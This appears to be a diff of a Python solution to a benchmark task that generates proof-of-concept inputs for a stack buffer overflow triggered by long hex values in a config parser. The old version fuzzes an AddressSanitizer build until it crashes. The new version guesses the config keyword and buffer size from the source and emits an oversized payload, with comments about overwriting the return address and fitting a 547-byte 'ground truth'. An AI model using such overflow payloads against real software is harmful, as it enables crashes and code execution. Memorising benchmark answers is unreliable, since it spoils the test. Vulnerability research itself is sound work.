@@ -1,160 +1,161 @@
 import os
+import re
 import tarfile
 import tempfile
-import subprocess
 import shutil
-import re
-import glob
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        temp_dir = tempfile.mkdtemp()
+        """
+        Generate a PoC that triggers the vulnerability.
+        
+        Analyzes the source code to identify configuration keywords and stack buffer sizes
+        associated with hex string parsing, then constructs a PoC config file.
+        """
+        extract_path = tempfile.mkdtemp()
         try:
-            # 1. Extract source code
+            # Extract source code
             with tarfile.open(src_path) as tar:
-                tar.extractall(path=temp_dir)
+                tar.extractall(path=extract_path)
             
-            # Locate source root
-            source_root = temp_dir
-            entries = os.listdir(temp_dir)
-            if len(entries) == 1 and os.path.isdir(os.path.join(temp_dir, entries[0])):
-                source_root = os.path.join(temp_dir, entries[0])
-
-            # 2. Analyze source for keys
-            c_files = glob.glob(os.path.join(source_root, "**", "*.c"), recursive=True)
-            cpp_files = glob.glob(os.path.join(source_root, "**", "*.cpp"), recursive=True)
-            all_src = c_files + cpp_files
+            # Default fallback values
+            best_keyword = "config"
+            best_size = 512
+            max_score = 0
+            is_xml = False
             
-            keys = set()
-            for fpath in all_src:
-                try:
-                    with open(fpath, 'r', errors='ignore') as f:
-                        content = f.read()
-                        # Extract string literals that might be config keys
-                        matches = re.findall(r'"([a-zA-Z0-9_-]+)"', content)
-                        for m in matches:
-                            if 2 < len(m) < 25:
-                                keys.add(m)
-                except:
-                    pass
+            # Regex patterns for static analysis
+            # Detect local stack buffers: char buf[1024];
+            re_buf = re.compile(r'char\s+(\w+)\s*\[\s*(\d+)\s*\]')
+            # Detect string literals which might be config keys
+            re_str = re.compile(r'"([a-zA-Z0-9_-]+)"')
+            # Detect hex parsing logic or indicators
+            re_hex = re.compile(r'0x|isxdigit|sscanf.*%x|strtol.*16|strtoul')
+            # Detect XML parsing context
+            re_xml = re.compile(r'xml|Xml|XML|<')
             
-            key_candidates = sorted(list(keys))
-            # Add common fallback keys
-            fallback_keys = ["config", "hex", "value", "key", "data", "id"]
-            for k in fallback_keys:
-                if k not in key_candidates:
-                    key_candidates.append(k)
-
-            # 3. Compile
-            executable = None
-            env = os.environ.copy()
-            # Enable AddressSanitizer to detect overflows
-            flags = '-fsanitize=address -g'
-            env['CFLAGS'] = flags
-            env['CXXFLAGS'] = flags
-            
-            # Check for Makefile
-            makefile_path = os.path.join(source_root, "Makefile")
-            if os.path.exists(makefile_path):
-                try:
-                    subprocess.run(['make', 'clean'], cwd=source_root, capture_output=True)
-                    subprocess.run(['make'], cwd=source_root, env=env, capture_output=True)
-                except:
-                    pass
-            
-            # Find executable produced by make
-            for root, dirs, files in os.walk(source_root):
-                for f in files:
-                    fp = os.path.join(root, f)
-                    if os.access(fp, os.X_OK) and not f.endswith(('.c', '.cpp', '.h', '.o', '.a', '.so')):
-                        executable = fp
-                        break
-                if executable: break
-
-            # Fallback manual compilation if make failed or no exe found
-            if not executable and all_src:
-                # Find file with main()
-                main_src = None
-                for f in all_src:
-                    try:
-                        with open(f, 'r', errors='ignore') as fo:
-                            if "main" in fo.read():
-                                main_src = f
-                                break
-                    except:
-                        pass
-                
-                if main_src:
-                    compiler = 'g++' if main_src.endswith('.cpp') else 'gcc'
-                    out_bin = os.path.join(source_root, 'vuln_manual')
-                    # Try compiling just the main file (simple challenges) or all (complex)
-                    # We try main file first as it's safer for single-file PoCs
-                    subprocess.run([compiler, main_src, '-o', out_bin, '-fsanitize=address', '-g'], capture_output=True)
-                    if os.path.exists(out_bin):
-                        executable = out_bin
-
-            # If still no executable, we cannot verify, so return a likely payload
-            if not executable:
-                return b"hex_val = 0x" + b"41" * 535 + b"\n"
-
-            # 4. Fuzz/Generate PoC
-            # Strategy: The vulnerability is "long hex values".
-            # Buffer is likely 512 bytes based on ground truth 547.
-            # We iterate lengths starting from 512 up to 600.
-            
-            formats = ["{k}={v}\n", "{k} = {v}\n", "{k} {v}\n", "{k}: {v}\n"]
-            
-            # Optimization: Try fallback keys first if list is huge
-            priority_keys = fallback_keys + key_candidates[:20]
-            
-            for length in range(512, 600, 1):
-                # Construct hex string
-                hex_str = "0x" + "A" * length
-                
-                for key in priority_keys:
-                    for fmt in formats:
-                        payload = fmt.format(k=key, v=hex_str).encode('utf-8')
+            # Walk through source files
+            for root, dirs, files in os.walk(extract_path):
+                for file in files:
+                    # Check filename for format hints
+                    if "xml" in file.lower():
+                        is_xml = True
                         
-                        fd, path = tempfile.mkstemp()
-                        os.write(fd, payload)
-                        os.close(fd)
-                        
+                    if file.endswith('.c') or file.endswith('.cpp') or file.endswith('.h'):
+                        path = os.path.join(root, file)
                         try:
-                            # Run target
-                            res = subprocess.run([executable, path], capture_output=True, timeout=0.5)
-                            
-                            # Check crash
-                            # ASAN returns non-zero and prints to stderr
-                            if res.returncode != 0:
-                                err = res.stderr.decode(errors='ignore')
-                                if "AddressSanitizer" in err or "stack-buffer-overflow" in err or res.returncode == -11:
-                                    return payload
-                        except:
-                            pass
-                        finally:
-                            if os.path.exists(path):
-                                os.unlink(path)
-            
-            # Fallback: try raw hex without key
-            for length in range(512, 600):
-                payload = ("0x" + "A" * length + "\n").encode()
-                fd, path = tempfile.mkstemp()
-                os.write(fd, payload)
-                os.close(fd)
-                try:
-                    res = subprocess.run([executable, path], capture_output=True, timeout=0.5)
-                    if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or res.returncode == -11):
-                        return payload
-                except:
-                    pass
-                finally:
-                    os.unlink(path)
+                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                        except Exception:
+                            continue
+                        
+                        # Check file content for XML hints
+                        if re_xml.search(content):
+                            is_xml = True
+                        
+                        # Find all stack buffer declarations in this file
+                        buffers = {}
+                        for m in re_buf.finditer(content):
+                            name = m.group(1)
+                            try:
+                                size = int(m.group(2))
+                                buffers[name] = size
+                            except ValueError:
+                                continue
+                        
+                        if not buffers:
+                            continue
+                        
+                        # Analyze line by line with a context window
+                        lines = content.splitlines()
+                        for i, line in enumerate(lines):
+                            # Look for lines related to hex processing
+                            if re_hex.search(line):
+                                # Define context window (e.g., +/- 30 lines)
+                                ctx_start = max(0, i - 30)
+                                ctx_end = min(len(lines), i + 30)
+                                context = "\n".join(lines[ctx_start:ctx_end])
+                                
+                                # Check if any known buffer is used in this context
+                                local_bufs_sizes = []
+                                for bname, bsize in buffers.items():
+                                    # Simple heuristic: variable name usage
+                                    if re.search(r'\b' + re.escape(bname) + r'\b', context):
+                                        local_bufs_sizes.append(bsize)
+                                
+                                if not local_bufs_sizes:
+                                    continue
+                                
+                                # Assume the smallest buffer is the most likely target for overflow
+                                current_size = min(local_bufs_sizes)
+                                
+                                # Find string literals in context (potential configuration keys)
+                                candidates = []
+                                for s in re_str.findall(context):
+                                    # Filter out common short strings or format specifiers
+                                    if len(s) > 2 and s not in ["0x", "%s", "%x", "rb", "wb", "Error", "error"]:
+                                        candidates.append(s)
+                                
+                                # Score each candidate keyword
+                                for key in candidates:
+                                    score = 10
+                                    # Higher score if keyword is used in a comparison (identifying the config option)
+                                    if "strcmp" in context and key in context:
+                                        score += 20
+                                    elif "strcasecmp" in context and key in context:
+                                        score += 20
+                                        
+                                    # Heuristic: 512 is a very common buffer size for this type of vulnerability
+                                    # and matches the ground truth length hint (547 bytes) well.
+                                    if current_size == 512:
+                                        score += 15
+                                    elif current_size == 256:
+                                        score += 10
+                                    elif current_size == 1024:
+                                        score += 5
+                                    
+                                    if score > max_score:
+                                        max_score = score
+                                        best_keyword = key
+                                        best_size = current_size
 
-            # If nothing worked, return a best-guess payload
-            return b"config = 0x" + b"A" * 540 + b"\n"
+            # If static analysis didn't find a strong candidate, assume 'value' or generic
+            if max_score == 0:
+                best_keyword = "value"
+            
+            # Construct the payload
+            # Ground truth is 547 bytes.
+            # If the buffer is 512 bytes, we need to overflow it to overwrite RIP/EIP.
+            # Usually ~20-40 bytes overflow is sufficient.
+            # 512 (buffer) + 40 (overflow) = 552 bytes of hex data.
+            # Plus "KEY = 0x" overhead (~10 bytes) -> ~562 bytes total.
+            # This is very close to the ground truth of 547.
+            
+            # We pad with 'A' (hex 0x41 is 'A', but here we are sending a string of hex digits)
+            # The vulnerability is "long hex values", usually implying a string copy of the digits
+            # or a buffer overflow during binary conversion. Given 547 bytes, string copy is more likely
+            # because binary conversion of 547 bytes input would only fill ~270 bytes buffer.
+            
+            padding_length = best_size + 40
+            # Ensure we don't generate something too small if best_size was tiny
+            if padding_length < 547:
+                 padding_length = 550
+                 
+            hex_payload = "A" * padding_length
+            
+            if is_xml:
+                # XML Format
+                poc = f"<{best_keyword}>0x{hex_payload}</{best_keyword}>"
+            else:
+                # Standard Config Format: KEY = 0xVALUE
+                # Used by many libs (libconfig, etc.) and custom parsers
+                poc = f"{best_keyword} = 0x{hex_payload}\n"
+            
+            return poc.encode('utf-8')
 
         except Exception:
-            return b"A" * 547
+            # Fail-safe payload
+            return b"config = 0x" + (b"A" * 600)
         finally:
-            if os.path.exists(temp_dir):
-                shutil.rmtree(temp_dir)
+            if os.path.exists(extract_path):
+                shutil.rmtree(extract_path)
